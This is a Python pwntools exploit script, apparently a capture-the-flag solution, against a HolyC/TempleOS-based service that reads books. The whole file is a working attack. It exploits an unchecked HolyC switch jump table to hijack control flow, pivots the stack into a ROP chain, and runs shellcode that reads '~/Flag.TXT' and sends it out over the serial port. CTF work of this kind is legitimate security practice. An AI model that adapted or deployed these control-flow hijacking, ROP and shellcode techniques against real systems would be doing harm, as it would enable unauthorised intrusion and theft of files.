#!/usr/bin/env python3
#
# @mebeim - 2025-03-15
#

import os
import sys

from pwn import context, log, remote, asm, flat


HOST = os.getenv('HOST', 'localhost')
PORT = int(os.getenv('PORT', 1337))


def main() -> int:
	context(arch='amd64')

	# These are in the pre-compiled kernel and therefore fixed
	Yield    = 0x105c5
	FileRead = 0x38ccc
	# Stack position is also fixed, we use it as a random safe place to write to
	stack    = 0x369a20b8

	# The code we want to hijack is the start of the switch [n] {...} statement
	# in DoCommand():
	#
	#    0x3677bd35:  movsx  rbx,WORD PTR [rsi*2+0x3677bf0b]
	#    0x3677bd3e:  add    ebx,0x3677bd46
	#    0x3677bd44:  jmp    rbx
	#
	# Here 0x3677bf0b is the jump offset table and 0x3677bd46 is the base
	# address for the jump. There is no bounds checking becaus of HolyC's
	# square-bracket switch [n] {...} semantics.
	#
	# The place we want to jmp to is 4 bytes into this CMP instruction:
	#
	#    0x3677bced:  cmp    rsi,0x5d58585e
	#    0x3677bcf4:  jl     0x3677be7d
	#    0x3677bcfa:  xor    eax,eax
	#
	# Which gives us:
	#
	#     0x3677bcf1:  pop    rax
	#     0x3677bcf2:  pop    rax
	#     0x3677bcf3:  pop    rbp          # RBP = MAlloc'd payload address
	#     0x3677bcf4:  jl     0x3677be7d
	#     0x3677bcfa:  xor    eax,eax
	#     0x3677bcfc:  rex.W push QWORD PTR fs:[rax+0x60]
	#     0x3677bd01:  xor    eax,eax
	#     0x3677bd03:  rex.W push QWORD PTR fs:[rax+0x58]
	#     0x3677bd08:  xor    eax,eax
	#     0x3677bd0a:  rex.W push QWORD PTR fs:[rax+0x50]
	#     0x3677bd0f:  xor    eax,eax
	#     0x3677bd11:  rex.W push QWORD PTR fs:[rax+0x48]
	#     0x3677bd16:  push   0x4
	#     0x3677bd18:  push   0x3677bee7
	#     0x3677bd1d:  call   0x18556
	#     0x3677bd22:  add    rsp,0x30
	#     0x3677bd26:  jmp    0x3677be7d
	#     ...
	#     0x3677be7d:  pop    rsi
	#     0x3677be7e:  leave               # Stack pivot into payload
	#     0x3677be7f:  ret
	#
	# DoCommand() code could technically be JITed in different places, but its
	# position stays more or less fixed. Worst case scenario we need to run the
	# exploit a few times.
	#
	DoCommand = 0x3677bc28
	jump_table = DoCommand + 0x2e3
	slot_addr  = 0x115a7

	# Find out-of-bounds jump table offset slot with good value in dumped memory
	# (only needed once). Loook at low mem addresses (kernel code):
	#
	#     (qemu) memsave 0x0 0x1000000 mem.bin
	#
	# jump_base = DoCommand + 0x11e
	# target    = DoCommand + 0xc5 + 4
	# needle    = (target - jump_base).to_bytes(2, 'little', signed=True)
	# mem       = open('mem.bin', 'rb').read()
	#
	# slot_addr = -1
	# while 1:
	# 	slot_addr = mem.find(needle, slot_addr + 1)
	# 	assert slot_addr != -1
	#
	# 	if (slot_addr - jump_table) % 2 == 0:
	# 		break
	# else:
	# 	log.failure('Failed to find jump table index')
	# 	return 1

	slot_idx = (slot_addr - jump_table) // 2
	log.info('Jump slot at 0x%x -> idx %d', slot_addr, slot_idx)

	# Small ROP chain that locates itself and jumps into shellcode.
	payload = flat([
		0x41414141        ,
		0x000000000000b039, # pop rax ; ret
		stack             ,
		0x00000000000ea85f, # push rsp ; add dword ptr [rax], eax ; add byte ptr [rbx + 0x5e], bl ; pop rdi ; pop rbp ; ret
		0x41414141        ,
		0x000000000000b039, # pop rax ; ret
		8 * 5             ,
		0x00000000000ca95d, # add edi, eax ; ret
		0x00000000000cd540, # push rdi ; ret
	])

	payload += asm(f'''
		/* FileRead("~/Flag.TXT", NULL, NULL); */
		push 0
		push 0
		lea eax, [rip + fname]
		push rax
		mov eax, {FileRead}
		call rax

		mov esi, eax
		mov ecx, 100
		mov edi, {Yield}

		/* Write to serial carefully one byte at a time. Could also be done with
		 * a simple REP OUTSB but that might hang the OS. */
	wait:
		mov dx, 0x3f8 + 5
		in al, dx
		and al, 0x20
		jnz ok
		call rdi
		jmp wait
	ok:
		mov dx, 0x3f8
		mov al, [esi]
		out dx, al
		inc esi
		loop wait

		/* Yield to properly flush serial. Again, optional, just to avoid hangs
		 * or crashes before we get the data. */
	done:
		call rdi
		jmp done

	fname:
		.asciz "~/Flag.TXT"
	''')

	log.info('Payload is %d bytes', len(payload))
	assert len(payload) <= 149
	assert b'\n' not in payload

	if len(payload) < 149:
		payload += b'\n'

	r = remote(HOST, PORT)

	log.info('Waiting for VM startup...')
	if r.recvuntil(b'What do you want to do?', timeout=15) == b'':
		log.failure('Timed out waiting for initial prompt')
		return 1

	r.sendlineafter(b'> ', b'1')
	r.sendafter(b'Which book? ', payload)
	r.sendlineafter(b'How many lines? ', b'1')

	if r.recvuntil(b'"!\n', timeout=5) == b'':
		log.failure('Timed out waiting for output (1)')
		return 1

	log.info('Triggering expl...')
	r.sendlineafter(b'> ', str(slot_idx).encode())

	if r.recvuntil(b'---\n', timeout=5) == b'':
		log.failure('Timed out waiting for output (2)')
		return 1

	flag = r.recvuntil(b'}', timeout=5)
	if flag == b'':
		log.failure('Timed out waiting for flag')
		return 1

	print(flag.decode())
	return 0


if __name__ == '__main__':
	sys.exit(main())
